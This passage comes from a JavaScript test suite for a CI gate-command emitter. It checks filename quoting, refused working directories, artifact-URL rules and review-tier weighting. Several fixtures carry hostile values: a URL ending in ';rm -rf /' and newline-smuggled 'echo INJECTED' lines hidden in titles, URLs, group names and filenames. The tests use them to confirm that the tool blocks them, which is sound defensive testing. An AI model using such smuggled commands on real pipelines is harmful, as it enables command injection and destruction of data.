  fixtureCommit(repoP4, 'routes')
  for (const f of ['src/app/(admin)/page.ts', 'src/app/[id]/page.ts']) fs.appendFileSync(path.join(repoP4, f), 'y')
  fs.rmSync(path.join(repoP4, 'src/app/[id]/gone.ts'))
  fs.rmSync(path.join(repoP4, 'old/[x]/a.ts'))
  for (const f of ['src/a$b.ts', 'src/{c}.ts', 'src/@modal/p.ts', 'src/+page.ts']) put(repoP4, f, 'x')
  const rP4 = await gates(repoP4)
  const p4Run = cmdLines(rP4.Out)
  check('P4 route-group and dynamic-segment files reach the file-scoped gate, single-quoted', anyLine(p4Run, P`(?-i)^    npx eslint 'app/\(admin\)/page\.ts' 'app/\[id\]/page\.ts'\r?$`), `lines: ${p4Run.join(' | ')}`)
  check('P4 and they are not reported as excluded', nm(rP4.Out, 'excluded: src/app/'), rP4.Out)
  check('P4 a deleted [id] file is not passed — it would glob onto a sibling', !anyLine(p4Run, P`gone\.ts`), `lines: ${p4Run.join(' | ')}`)
  check('P4 the deletion is said, parenthesized, with its name',
    m(rP4.Out, P`\n    \(1 changed file\(s\) absent from the working tree — deleted, or removed from disk while still staged — nothing on disk`) && m(rP4.Out, P`\n    \(absent: src/app/\[id\]/gone\.ts\)`), rP4.Out)
  check('P4 a deleted file is not called ungated or excluded', nm(rP4.Out, P`excluded: src/app/\[id\]/gone`), rP4.Out)
  check('P4 $ { @ + stay excluded (ADR 0112 option C) and are named — * and ? cannot be Windows filenames, AD1 holds them',
    m(rP4.Out, P`excluded: src/a\$b\.ts`) && m(rP4.Out, P`excluded: src/\{c\}\.ts`) && m(rP4.Out, P`excluded: src/@modal/p\.ts`) && m(rP4.Out, P`excluded: src/\+page\.ts`), rP4.Out)
  check('P4 a group whose only file was deleted skips its file-scoped gate, keeps its whole-program one',
    m(rP4.Out, P`\n  \[gone\] 1 file\(s\)\r?\n    \(1 changed file\(s\) absent`) && anyLine(p4Run, P`^\s{4}npx tsc --noEmit`) && !anyLine(p4Run, P`eslint\s*$`), `lines: ${p4Run.join(' | ')}\n${rP4.Out}`)
  })
  section('P4b', ['P4'], async () => {
  // P4b: a file STAGED and then removed from disk is committed from the index,
  // yet no file-scoped tool can read it — the note must not call it a deletion alone, and it must not
  // be dropped silently. Staged-list scope, as the pre-commit hook calls the emitter.
  const repoP4b = newRepo('staged-then-removed', CFG_ROUTES, ['src/app/[id]/new.ts'])
  gitq(repoP4b, ['add', '-A'])
  fs.rmSync(path.join(repoP4b, 'src/app/[id]/new.ts'))
  const rP4b = await gates(repoP4b, ['src/app/[id]/new.ts'])
  check('P4b a staged file missing from disk is reported absent with both causes named, never passed',
    m(rP4b.Out, 'removed from disk while still staged') && m(rP4b.Out, P`\(absent: src/app/\[id\]/new\.ts\)`) && nm(rP4b.Out, "npx eslint 'app/"), rP4b.Out)
  })
  section('P5', [], async () => {
  // --- P5: the widening is FILE arguments only — cwd and script paths keep token_ok ----------------
  // cwd is emitted unquoted (`cd <cwd> &&`, the CI awk table reads `$2`), a script path as `$1`/`$4`;
  // a `(` there would be a subshell or a glob for sh. Mutation anchor for the other direction of P4:
  // widening token_ok instead of the file predicate turns these refusals into composed commands.
  const CFG_P5 = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "paren", "match": "^a/", "cwd": "w(x)", "strip_prefix": "a/", "gates": ["ruff"] },
    { "name": "brack", "match": "^b/", "cwd": "w[x]", "strip_prefix": "b/", "gates": ["ruff"] },
    { "name": "scr", "match": "^c/", "cwd": "", "strip_prefix": "", "gates": [ { "runner": "python", "script": "tools/(gen).py", "files": true } ] }
  ]
}`
  const repoP5 = newRepo('widen-files-only', CFG_P5, ['a/x.py', 'b/y.py', 'c/z.py', 'tools/(gen).py'])
  const rP5 = await gates(repoP5)
  const p5Run = cmdLines(rP5.Out)
  check('P5 a cwd with ( ) is still refused, never composed', !anyLine(p5Run, P`cd w\(x\)|cd 'w\(x\)'`), `lines: ${p5Run.join(' | ')}`)
  check('P5 a cwd with [ ] is still refused, never composed', !anyLine(p5Run, P`cd w\[x\]|cd 'w\[x\]'`), `lines: ${p5Run.join(' | ')}`)
  check('P5 a script-gate path with ( ) is still refused', !anyLine(p5Run, P`\(gen\)`) && m(rP5.Out, P`tools/\(gen\)\.py`), `lines: ${p5Run.join(' | ')}\n${rP5.Out}`)
  })
  section('Q', ['P'], async () => {
  // --- Q: excluding EVERY file must not escalate the gate to the whole tree -----------------------
  // A file-scoped gate with no file list is a whole-tree run (`ruff check` lints everything). So a
  // group whose every changed filename is unusable as an argument must SKIP its gate, not emit a bare
  // one — otherwise the exclusion silently widens scope instead of narrowing it.
  const repoQ = newRepo('all-files-excluded', CFG_FILES, ['src/keep.txt'])
  put(repoQ, 'src/a b.py')
  put(repoQ, 'src/c d.py')
  fs.rmSync(path.join(repoQ, 'src/keep.txt'))
  const rQ = await gates(repoQ)
  const qRun = cmdLines(rQ.Out)
  g('Q no bare whole-tree command is emitted', !anyLine(qRun, P`ruff check\s*$`), `lines: ${qRun.join(' | ')}`)
  g('Q the gate is reported as skipped, with the reason', m(rQ.Out, "skipped — none of this group's changed files can be a command argument"), rQ.Out)
  g('Q the skip is parenthesized so neither parser runs it', m(rQ.Out, P`\n    \(skipped — `), rQ.Out)
  g('Q a skipped gate does not count as emitted', m(rQ.Out, 'none — no declared group matched, matched groups declare no gates, or every declared gate was refused or skipped'), rQ.Out)
  })
  section('R', [], async () => {
  // --- R: cwd reaches a command position too (`cd <cwd> && …`) ------------------------------------
  // safe_path permits a space, '#' and '*'; none of those survives `sh -c` or the output parsers.
  const CFG_CWD = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "spacey", "match": "^app/", "cwd": "my dir", "strip_prefix": "app/", "gates": ["ruff"] },
    { "name": "globby", "match": "^lib/", "cwd": "a*b", "strip_prefix": "lib/", "gates": ["ruff"] },
    { "name": "fine", "match": "^ok/", "cwd": "sub/dir", "strip_prefix": "ok/", "gates": ["ruff"] }
  ]
}`
  const repoR = newRepo('hostile-cwd', CFG_CWD, ['app/x.py', 'lib/y.py', 'ok/z.py'])
  const rR = await gates(repoR)
  const rRun = cmdLines(rR.Out)
  g('R a cwd with a space is refused, not composed', !anyLine(rRun, 'cd my dir'), `lines: ${rRun.join(' | ')}`)
  g('R a cwd with a glob is refused, not composed', !anyLine(rRun, P`cd a\*b`), `lines: ${rRun.join(' | ')}`)
  g('R the refusal says commands now run from the repo root', m(rR.Out, 'run from the repo root'), rR.Out)
  g('R a refused cwd still emits the gate itself (no silent coverage loss)', anyLine(rRun, P`^\s{4}uv run ruff check x\.py`), `lines: ${rRun.join(' | ')}`)
  g('R a clean cwd is still composed', anyLine(rRun, P`cd sub/dir && uv run ruff check z\.py`), `lines: ${rRun.join(' | ')}`)
  })
  section('S', [], async () => {
  // --- S: declared artifacts must be linked in the README (ADR 0032) ------------------------------
  // The gate cannot see claude.ai (consuming-repo CI carries no credentials, ADR 0023), so the
  // DECLARATION is the enforced surface: the README carries each declared url, each declared title
  // starts with the repo name. The emitter stays advisory; the vendored CI fails on the exact
  // string `^artifact: VIOLATION`, so these cases pin the line shapes that grep depends on.
  newArtCfg = (url, title, readme = 'README.md') => `{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "readme": "${readme}", "items": [ { "url": "${url}", "title": "${title}" } ] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}`
  SURL = 'https://claude.ai/code/artifact/AbCdEf12-3456-7890-abcd-ef1234567890'
  })
  section('S1', ['S'], async () => {
  // S1: a satisfied declaration. Mixed-case hex in the id on purpose — an over-strict lowercase-only
  // URL gate is a false BLOCK.
  const repoS1 = newRepo('art-ok', newArtCfg(SURL, 'art-ok · 온보딩 가이드'), ['src/x.py'])
  put(repoS1, 'README.md', `docs: ${SURL} fin`)
  const rS1 = await gates(repoS1)
  check('S1 satisfied declaration reports ok — readme, url, title, repo name, source',
    m(rS1.Out, P`artifact: ok — README\.md links https://claude\.ai/code/artifact/AbCdEf12.* · title 'art-ok · 온보딩 가이드' starts with repo name 'art-ok' \(from directory name\)`), rS1.Out)
  check('S1 the ok path emits no violation', nm(rS1.Out, 'artifact: VIOLATION'), rS1.Out)
  check("S1 artifact lines print ABOVE gates: (outside both output parsers' windows)", m(rS1.Out.split(/gates:/iu)[0], 'artifact: ok'), rS1.Out)
  })
  section('S1b', ['S'], async () => {
  // S1b: the short form the Artifact tool's listing returns (ADR 0104) — a 22-char
  // alphanumeric id, mixed case. A VIOLATION here would fail the vendored CI.
  const SHORT = 'https://claude.ai/artifact/MHATJt6vTrR9i8hBYVofKR'
  const repoS1b = newRepo('art-short', newArtCfg(SHORT, 'art-short · 온보딩 가이드'), ['src/x.py'])
  put(repoS1b, 'README.md', `docs: ${SHORT} fin`)
  const rS1b = await gates(repoS1b)
  check('S1b the short claude.ai/artifact/<id> form is ok', m(rS1b.Out, P`artifact: ok — README\.md links https://claude\.ai/artifact/MHATJt6vTrR9i8hBYVofKR`) && nm(rS1b.Out, 'artifact: VIOLATION'), rS1b.Out)
  })
  section('S1c', ['S'], async () => {
  // S1c: the widening is exactly two forms — a near miss of each still fails: an empty id, a
  // character outside the id alphabet, a plural path, the short form's id under /code/ (a non-hex
  // id there is not valid), http, and a trailing newline (the `\Z` anchor —
  // the JSON escape `\n` lands as a real newline in the declared value, as in S10c).
  let nearN = 0
  for (const bad of ['https://claude.ai/artifact/', 'https://claude.ai/artifact/abc.def', 'https://claude.ai/artifacts/MHATJt6vTrR9i8hBYVofKR',
    'https://claude.ai/code/artifact/MHATJt6vTrR9i8hBYVofKR', 'http://claude.ai/artifact/MHATJt6vTrR9i8hBYVofKR', `https://claude.ai/artifact/MHATJt6vTrR9i8hBYVofKR${BS}n`]) {
    nearN++
    const repoS1c = newRepo(`art-near-${nearN}`, newArtCfg(bad, 'art-near · docs'), ['src/x.py'])
    put(repoS1c, 'README.md', `docs: ${bad}`)
    const rS1c = await gates(repoS1c)
    check(`S1c a near miss is still a VIOLATION: ${bad}`,
      m(rS1c.Out, P`artifact: VIOLATION.*url is not a claude\.ai Artifact URL \(want https://claude\.ai/artifact/<id> or https://claude\.ai/code/artifact/<id>\)`), rS1c.Out)
  }
  })
  section('S2', ['S'], async () => {
  // S2: the README lacks the declared link — the violation CI fails on, still advisory here.
  repoS2 = newRepo('art-nolink', newArtCfg(SURL, 'art-nolink · docs'), ['src/x.py'])
  put(repoS2, 'README.md', 'no link here')
  const rS2 = await gates(repoS2)
  check('S2 a missing README link is a VIOLATION naming the readme', m(rS2.Out, "artifact: VIOLATION — 'art-nolink · docs': README\\.md does not contain the declared URL"), rS2.Out)
  check('S2 the emitter stays advisory (exit 0) — CI is the enforcement point', rS2.Code === 0, `exit=${rS2.Code}`)
  check('S2 the violation also reaches stderr as a warn (what pre-commit shows a human)', m(rS2.Out, P`warn: artifacts: 1 declared item\(s\) violate the README-link/title/source rule`), rS2.Out)
  })
  section('S3', ['S'], async () => {
  // S3: the title must start with the repo name — at a non-alphanumeric boundary, case-insensitive.
  const repoS3 = newRepo('art-title', newArtCfg(SURL, 'Docs · ADR & Spec'), ['src/x.py'])
  put(repoS3, 'README.md', `docs: ${SURL}`)
  const rS3 = await gates(repoS3)
  check('S3 a foreign title is a VIOLATION naming the expected repo name and its source', m(rS3.Out, P`artifact: VIOLATION — 'Docs · ADR & Spec': title does not start with repo name 'art-title' \(from directory name\)`), rS3.Out)
  const repoS3b = newRepo('art', newArtCfg(SURL, 'artisan · docs'), ['src/x.py'])
  put(repoS3b, 'README.md', `docs: ${SURL}`)
  const rS3b = await gates(repoS3b)
  check('S3b a longer word sharing the prefix is NOT a match (boundary must be non-alphanumeric)', m(rS3b.Out, "artifact: VIOLATION.*does not start with repo name 'art'"), rS3b.Out)
  const repoS3c = newRepo('art-case', newArtCfg(SURL, 'ART-CASE · docs'), ['src/x.py'])
  put(repoS3c, 'README.md', `docs: ${SURL}`)
  const rS3c = await gates(repoS3c)
  check('S3c the prefix match is case-insensitive (a legitimate ALL-CAPS title is not blocked)', m(rS3c.Out, 'artifact: ok'), rS3c.Out)
  })
  section('S4', ['A'], async () => {
  // S4: no declaration — the check is DISABLED and says so (retro-gate convention, never silent).
  // rA is case A's run: CFG declares no artifacts.
  check('S4 no declaration reports the check as disabled, not silent', m(rA.Out, 'artifact: none declared'), rA.Out)
  check('S4 an undeclared repo emits no violation (opt-in, stated in ADR 0032)', nm(rA.Out, 'artifact: VIOLATION'), rA.Out)
  })
  section('S5', [], async () => {
  // S5: a malformed declaration is a VIOLATION, never a silent drop — a typo that disabled
  // enforcement while reading as coverage is the enabledPlugins parse-failure class.
  const CFG_MAL = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "artifacts": { "items": "nope" },
  "groups": []
}`
  const repoS5 = newRepo('art-malformed', CFG_MAL, ['src/x.py'])
  const rS5 = await gates(repoS5)
  check('S5 items of the wrong type is a VIOLATION, not a drop', m(rS5.Out, P`artifact: VIOLATION — \.harness\.json artifacts is malformed`), rS5.Out)
  const CFG_MAL2 = rep(CFG_MAL, '"items": "nope"', '"items": [ "just-a-string" ]')
  const repoS5b = newRepo('art-malformed-item', CFG_MAL2, ['src/x.py'])
  const rS5b = await gates(repoS5b)
  check('S5b a non-object item is a VIOLATION naming its index', m(rS5b.Out, P`artifact: VIOLATION — items\[0\] is not an object with 'url' and 'title'`), rS5b.Out)
  })
  section('S6', ['S'], async () => {
  // S6: a url that is not a claude.ai Artifact URL — including a hostile one. The value may be
  // echoed in the top-level artifact line (refusals are echoed where a reader looks), but it must
  // never appear inside the 4-space gate-command window either parser executes.
  const repoS6 = newRepo('art-badurl', newArtCfg('https://evil.example/a;rm -rf /', 'art-badurl · docs'), ['src/x.py'])
  put(repoS6, 'README.md', 'x')
  const rS6 = await gates(repoS6)
  const s6Run = cmdLines(rS6.Out, false)
  check('S6 a non-artifact url is a VIOLATION', m(rS6.Out, P`artifact: VIOLATION.*url is not a claude\.ai Artifact URL`), rS6.Out)
  check('S6 the hostile value never enters the gate-command window', !anyLine(s6Run, P`evil\.example|rm -rf`), `lines: ${s6Run.join(' | ')}`)
  })
  section('S7', ['S'], async () => {
  // S7: a declared readme that cannot be read is a VIOLATION — an unverifiable link must not pass.
  const repoS7 = newRepo('art-noreadme', newArtCfg(SURL, 'art-noreadme · docs', 'DOCS.md'), ['src/x.py'])
  const rS7 = await gates(repoS7)
  check('S7 an unreadable readme is a VIOLATION naming the path', m(rS7.Out, P`artifact: VIOLATION.*README 'DOCS\.md' cannot be read`), rS7.Out)
  })
  section('S8', ['S'], async () => {
  // S8: the artifact status prints even when NOTHING changed — CI's push-to-main run reaches
  // exactly the empty-scope early return and is an enforcement point.
  const repoS8 = newRepo('art-clean', newArtCfg(SURL, 'art-clean · docs'), [])
  put(repoS8, 'README.md', `docs: ${SURL}`)
  fixtureCommit(repoS8, 'readme')
  const rS8 = await gates(repoS8)
  check('S8 artifact status prints on the no-changed-files path', m(rS8.Out, 'artifact: ok') && m(rS8.Out, 'no changed files — nothing to gate'), rS8.Out)
  })
  section('S9', ['S'], async () => {
  // S9: the origin remote's basename wins over the directory name — a renamed local clone must not
  // flip the verdict, and the printed source makes a mismatch diagnosable.
  const repoS9 = newRepo('art-dirname', newArtCfg(SURL, 'remote-name · docs'), ['src/x.py'])
  put(repoS9, 'README.md', `docs: ${SURL}`)
  gitq(repoS9, ['remote', 'add', 'origin', 'https://github.com/example-org/remote-name.git'])
  const rS9 = await gates(repoS9)
  check('S9 repo name comes from the origin remote when one exists', m(rS9.Out, "artifact: ok.*repo name 'remote-name' \\(from origin remote\\)"), rS9.Out)
  })
  section('S10', ['S'], async () => {
  // S10: a declared value carrying a NEWLINE (ADR 0032). A `title` echoed verbatim above `gates:`
  // would let a declaration spell the window's own anchors (`gates:` / a 4-space line / `review tier:`)
  // and land a command that CI's extraction hands to `sh -c` — while the item still reported
  // `artifact: ok`, so the workflow's `^artifact: VIOLATION` step would pass. Two layers, asserted separately: the declaration is REFUSED,
  // and the printed line stays ONE line whatever is declared. `\n` below is a JSON escape — the
  // fixture file is what a hostile repo would actually commit.
  const INJ = P`art-inj\ngates:\n    echo INJECTED-VIA-TITLE\nreview tier: full - x`
  const repoS10 = newRepo('art-inj', newArtCfg(SURL, INJ), ['src/x.py'])
  put(repoS10, 'README.md', `docs: ${SURL}`)
  const rS10 = await gates(repoS10)
  const s10Run = cmdLines(rS10.Out, false)
  check('S10 a control character in a declared value is a VIOLATION (layer 1: the declarer is told)', m(rS10.Out, 'artifact: VIOLATION.*control character'), rS10.Out)
  check('S10 the forged command never enters the gate-command window (layer 2: one value, one line)', !anyLine(s10Run, 'INJECTED-VIA-TITLE'), `lines: ${s10Run.join(' | ')}`)
  check('S10 the newline is escaped VISIBLY, not stripped — the reader sees what was declared', m(rS10.Out, P`artifact: VIOLATION.*art-inj\\ngates:`), rS10.Out)
  check('S10 the emitter still prints exactly one gates: header', count(rS10.Out, /^gates:/gmu) === 1, rS10.Out)
  })
  section('S10b', ['S'], async () => {
  // S10b: the same through `url`. A refused url is echoed as the VIOLATION label when the title is
  // blank, so that label is a second injection path: it must use the escaped url, never the RAW one.
  const repoS10b = newRepo('art-injurl', newArtCfg(P`https://evil.example/x\ngates:\n    echo INJECTED-VIA-URL\nreview tier: x`, ''), ['src/x.py'])
  put(repoS10b, 'README.md', 'x')
  const rS10b = await gates(repoS10b)
  const s10bRun = cmdLines(rS10b.Out, false)
  check('S10b a hostile url reaches the reader as one escaped line, never a forged command', !anyLine(s10bRun, 'INJECTED-VIA-URL'), `lines: ${s10bRun.join(' | ')}`)
  check('S10b the empty-title fallback label is the ESCAPED url', m(rS10b.Out, P`artifact: VIOLATION — https://evil\.example/x\\ngates:`), rS10b.Out)
  })
  section('S10c', ['S'], async () => {
  // S10c: a url whose only defect is a TRAILING newline. A `$`-anchored check, where `$` matches before a
  // final newline, would call this a valid Artifact URL, so the check needs a full-match anchor.
  // (Same class as SAFE_TOKEN, which needs the same anchor — case V pins it.)
  const repoS10c = newRepo('art-trailnl', newArtCfg(`${SURL}${BS}n`, 'art-trailnl · docs'), ['src/x.py'])
  put(repoS10c, 'README.md', `docs: ${SURL}`)
  const rS10c = await gates(repoS10c)
  check('S10c a trailing newline does NOT pass the url check (\\Z, not $)', m(rS10c.Out, 'artifact: VIOLATION'), rS10c.Out)
  })
  section('S10d', ['S'], async () => {
  // S10d: a UNICODE line break (U+2028, spelled as the JSON escape a hostile repo would commit).
  // No shell parser splits on it, so this case exists for the OTHER consumers: Python's
  // `str.splitlines` does, and a model reading the emitter's output may render it as a break. The
  // refusal covers the class rather than only the bytes `sh` cares about.
  // The escape is built from a backslash and the text `u2028`, so no source line holds the separator itself.
  const JSON_LS = `${BS}u2028`
  const repoS10d = newRepo('art-u2028', newArtCfg(SURL, `art-u2028 ${JSON_LS}gates:${JSON_LS}    echo VIA-U2028`), ['src/x.py'])
  put(repoS10d, 'README.md', `docs: ${SURL}`)
  const rS10d = await gates(repoS10d)
  check('S10d a Unicode line separator is refused too (the consumer set is wider than the shell parsers)', m(rS10d.Out, 'artifact: VIOLATION.*control character'), rS10d.Out)
  check(`S10d it is escaped as a visible ${JSON_LS}, so the reader sees which character it was`, m(rS10d.Out, `art-u2028 ${BS}${BS}u2028gates:`), rS10d.Out)

  // A legitimate declaration must NOT be caught by any of this: the canon's own title is Korean with
  // a mid-dot separator, and an over-strict refusal would be a false BLOCK.
  const repoS10e = newRepo('art-utf8', newArtCfg(SURL, 'art-utf8 · 오단보드 🧭'), ['src/x.py'])
  put(repoS10e, 'README.md', `docs: ${SURL}`)
  const rS10e = await gates(repoS10e)
  check('S10e Korean, an emoji and a mid-dot are not control characters — a real title still passes', m(rS10e.Out, 'artifact: ok') && nm(rS10e.Out, 'artifact: VIOLATION'), rS10e.Out)
  })
  section('S11', [], async () => {
  // S11: a second injection site, worse placed than the artifact one: a group NAME is echoed as
  // `  [<name>] N file(s)` INSIDE the window, so a newline there forges a gate command with no
  // artifact declaration involved at all. Sanitized at load (so every later echo is the safe form),
  // and warned about rather than silently renamed.
  const CFG_INJNAME = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [ { "name": "py]\n    echo INJECTED-VIA-GROUP-NAME\n  [py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}`
  const repoS11 = newRepo('grp-inj', CFG_INJNAME, ['src/x.py'])
  const rS11 = await gates(repoS11)
  const s11Run = cmdLines(rS11.Out)
  check('S11 a newline in a group name cannot forge a gate command line', !anyLine(s11Run, 'INJECTED-VIA-GROUP-NAME'), `lines: ${s11Run.join(' | ')}`)
  check('S11 the escaped name is still reported on its group line (no silent rename)', m(rS11.Out, P`\[py\]\\n    echo INJECTED-VIA-GROUP-NAME\\n  \[py\]`), rS11.Out)
  check('S11 the escaping is warned about, not silent', m(rS11.Out, P`warn: groups\[0\]: control character\(s\) in the group name were escaped`), rS11.Out)
  })
  section('S12', [], async () => {
  // S12: a third injection site: the review-tier reasoning line interpolates critical-surface FILENAMES, and a filename arrives from the documented
  // positional CLI argument with no git quoting in the way. The forged block lands AFTER the real
  // `review tier:` line, which looks safe until you remember that a second `^gates:` RE-ARMS sed's
  // range: the window reopens and the injected 4-space line is extracted. Both parsers are asserted,
  // and `hc.say()` is what holds it.
  const CFG_CRIT = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": ["^src/"] },
  "groups": [ { "name": "py", "match": "^src/", "cwd": "", "strip_prefix": "", "gates": [] } ]
}`
  const repoS12 = newRepo('crit-inj', CFG_CRIT, ['src/a.py'])
  const crafted = L('src/a.py', 'gates:', '    echo INJECTED-VIA-CRITICAL', 'review tier: x')
  const rS12 = await gates(repoS12, [crafted])
  const s12Run = cmdLines(rS12.Out)
  check('S12 a crafted critical-surface filename cannot forge a gate command', !anyLine(s12Run, 'INJECTED-VIA-CRITICAL'), `lines: ${s12Run.join(' | ')}`)
  check('S12 no second gates: header can be opened (a re-armed sed range is the exploit)', count(rS12.Out, /^gates:/gmu) === 1, rS12.Out)
  check('S12 the tier line still NAMES the file, escaped — the reason stays auditable', m(rS12.Out, P`critical surface touched \(src/a\.py\\ngates:`), rS12.Out)
  })
  section('S12b', [], async () => {
  // S12b: two groups whose names differ ONLY in characters that escape to the same text. Sanitizing
  // names for display creates this collision class; the file-set map is keyed by
  // POSITION so each group still reports and gates its own files.
  const CFG_COLL = P`{
  "review": { "canon": "REVIEW.md", "docs_only": [], "harness_layer": [], "critical": [] },
  "groups": [
    { "name": "dup\nx", "match": "^a/", "cwd": "", "strip_prefix": "", "gates": [] },
    { "name": "dup\\nx", "match": "^b/", "cwd": "", "strip_prefix": "", "gates": [] }
  ]
}`
  const repoS12b = newRepo('grp-collide', CFG_COLL, ['a/one.py', 'b/two.py'])
  const rS12b = await gates(repoS12b)
  check('S12b colliding escaped group names do not share a file list — each reports 1 file', count(rS12b.Out, /^\s+\[dup\\nx\] 1 file\(s\)/gmu) === 2, rS12b.Out)
  check('S12b neither file is reported as ungrouped (both groups still matched their own)', nm(rS12b.Out, P`ungrouped \(`), rS12b.Out)
  })
  section('T', [], async () => {
  // --- T: class-weighted tier (ADR 0035) — docs_only files stop counting toward size --------------
  // The SCOPE never narrows; only the size MEASURE does, and a non-empty exclusion must be stated
  // on the tier line. With no docs files in the diff the wording must stay byte-identical to the
  // unweighted form (T4 pins that on G2's output).
  })
  section('T1', [], async () => {
  // T1: FILE-count weighting. 9 files (7 docs + 2 code) breaches SMALL_MAX_FILES=5; the counted
  // set is 2 — small. A total-based measure would say full here, which is the regression class.
  const t1Files = [1, 2, 3, 4, 5, 6, 7].map((i) => `docs/d${i}.md`).concat(['api/x.py', 'api/y.py'])
  const repoT1 = newRepo('tier-weighted-files', CFG, t1Files)
  const rT1 = await gates(repoT1)
  check('T1 docs-heavy mixed diff earns small on the counted set', m(rT1.Out, P`review tier: small — 2 counted file\(s\) / \d+ counted line\(s\), no critical surface`), rT1.Out)
  check('T1 the exclusion is stated, never silent', m(rT1.Out, P`7 docs-only file\(s\) excluded from the size measure, still in review scope`), rT1.Out)
  })
  section('T2', [], async () => {
  // T2: LINE weighting. Tracked changes: ~300 changed lines in a docs file, ~6 in a code file —
  // the total breaches SMALL_MAX_LINES=150, the counted sum does not.
  numbered = (prefix, n) => Array.from({ length: n }, (_, i) => `${prefix}${i + 1}`).join('\n')
  repoT2 = newRepo('tier-weighted-lines', CFG, ['docs/huge.md', 'api/small.py'])
  fixtureCommit(repoT2, 'base')
  put(repoT2, 'docs/huge.md', numbered('doc line ', 300))
  put(repoT2, 'api/small.py', numbered('code = ', 5))
  const rT2 = await gates(repoT2)
  check('T2 docs lines do not count toward the line threshold', m(rT2.Out, P`review tier: small — 1 counted file\(s\) / \d+ counted line\(s\), no critical surface`), rT2.Out)
  check('T2 the one excluded docs file is stated', m(rT2.Out, P`1 docs-only file\(s\) excluded from the size measure`), rT2.Out)
  })
  section('T2b', ['T2'], async () => {
  // T2b: the weighting must not bless a big CODE change hiding among docs — counted lines over the
  // threshold stay full, with the weighted wording (the reason must match the measure it used).
  put(repoT2, 'api/small.py', numbered('code = ', 200))
  const rT2b = await gates(repoT2)
  check('T2b counted lines over the threshold still earn full', m(rT2b.Out, P`review tier: full — 1 counted file\(s\) / \d+ counted line\(s\)`), rT2b.Out)
  check('T2b the full reason states the exclusion too', m(rT2b.Out, 'review tier: full — .*docs-only file\\(s\\) excluded from the size measure'), rT2b.Out)
  })
  section('T3', [], async () => {
  // T3: weighting never bypasses criticality — a critical file among many docs is still full.
  const repoT3 = newRepo('tier-weighted-critical', CFG, [1, 2, 3, 4, 5, 6].map((i) => `docs/c${i}.md`).concat(['migrations/001.sql']))
  const rT3 = await gates(repoT3)
  check('T3 critical wins over any weighted size', m(rT3.Out, P`review tier: full — critical surface touched \(migrations/001\.sql`), rT3.Out)
  })
  section('T4', ['G'], async () => {
  // T4: no docs files in the diff → the unweighted wording, byte-identical (G2 is the fixture:
  // docs_only IS declared there, none of its 7 files match).
  check('T4 with no docs files in the diff the wording stays unweighted (G2 control)', nm(rG2.Out, 'counted file|excluded from the size measure'), rG2.Out)
  })
  section('T5', ['T2'], async () => {
  // T5: a docs→code RENAME must not smuggle its lines out of the measure. numstat prints the
  // rename as `docs/a.md => api/big.py`, whose START matches `^docs/` — matching the declared
  // patterns against that raw record would exempt what is now a code file and earn `small` on a
  // hundreds-of-lines code change. Exemption is by membership in the name-only listing, so an
  // unlisted record COUNTS; this case is red under the regex-on-raw-record form.
  const repoT5 = newRepo('tier-rename', CFG, ['docs/a.md'])
  put(repoT5, 'docs/a.md', numbered('doc line ', 200))
  fixtureCommit(repoT5, 'base')
  fs.mkdirSync(path.join(repoT5, 'api'), { recursive: true })
  gitq(repoT5, ['mv', 'docs/a.md', 'api/big.py'])
  fs.appendFileSync(path.join(repoT5, 'api/big.py'), `\n${numbered('code = ', 160)}`)
  gitq(repoT5, ['add', '-A'])
  const rT5 = await gates(repoT5)
  check('T5 a docs-to-code rename cannot smuggle its lines out of the measure (tier full)', m(rT5.Out, 'review tier: full'), rT5.Out)
  check('T5 the renamed code file never earns small', nm(rT5.Out, 'review tier: small'), rT5.Out)
  })
  section('T6', ['T2'], async () => {
  // T6: untracked files weigh their lines. `git diff --numstat` never lists an
  // untracked file, and a slice closes with its new files untracked, so without the weighing each one
  // would count 0 lines and a 200-line new code file would earn `small`. The oracle is git itself: after `git add -N`
  // the same files reach numstat, and the tier line must not move (T6b). Fixture: 200 lines with a
  // final newline, 3 without, an empty file, a binary (a NUL byte — numstat prints `-`), a 300-line
  // docs file (exempt), and an untracked nested repository (one line, like a gitlink; it stays
  // untracked in both runs). Each branch of `added_lines` moves the exact figures T6 pins.
  repoT6 = newRepo('tier-untracked', CFG, [])
  put(repoT6, 'api/new.py', Array.from({ length: 200 }, (_, i) => `code = ${i + 1}\n`).join(''))
  put(repoT6, 'api/tail.py', 'a\nb\nc')
  put(repoT6, 'api/empty.py', '')
  fs.writeFileSync(path.join(repoT6, 'api/blob.py'), Buffer.from([0, ...Array.from({ length: 400 }, () => 10)]))
  put(repoT6, 'docs/big.md', numbered('doc line ', 300))
  gitq(repoT6, ['init', '-q', path.join(repoT6, 'api/nested')])
  const rT6 = await gates(repoT6)
  check('T6 untracked files weigh their lines: a 200-line new code file earns full', m(rT6.Out, P`review tier: full — 5 counted file\(s\) / 204 counted line\(s\) — 1 docs-only file\(s\) excluded`), rT6.Out)
  gitq(repoT6, ['add', '-N', '--', 'api/new.py', 'api/tail.py', 'api/empty.py', 'api/blob.py', 'docs/big.md'])
  const rT6b = await gates(repoT6)
  const tierOf = (out) => (/^review tier: .*$/mu.exec(out) ?? [''])[0]
  const t6Tier = tierOf(rT6.Out)
  const t6bTier = tierOf(rT6b.Out)
  check('T6b the untracked count equals numstat\'s own after git add -N (same tier line)', t6Tier !== '' && t6Tier === t6bTier, `untracked: ${t6Tier}\nadd -N:    ${t6bTier}`)
  })
  section('T6c', [], async () => {
  // T6c: the two branches T6's fixture cannot reach portably, through a direct import (case V's
  // pattern). A path that cannot be read makes the whole measure unknown,
  // never a 0 (red against a per-file `continue`). A symlink counts 1 line, its target, whether the
  // target is a 50-line file or missing (red without the isSymbolicLink branch: 50, or a read error). A
  // host that refuses fs.symlinkSync (Windows without the privilege) reports that half as a SKIP. The
  // numstat half must answer on its own first, or the unknown check would pass on a git failure.
  })
  section('T6d', ['F', 'T6'], async () => {
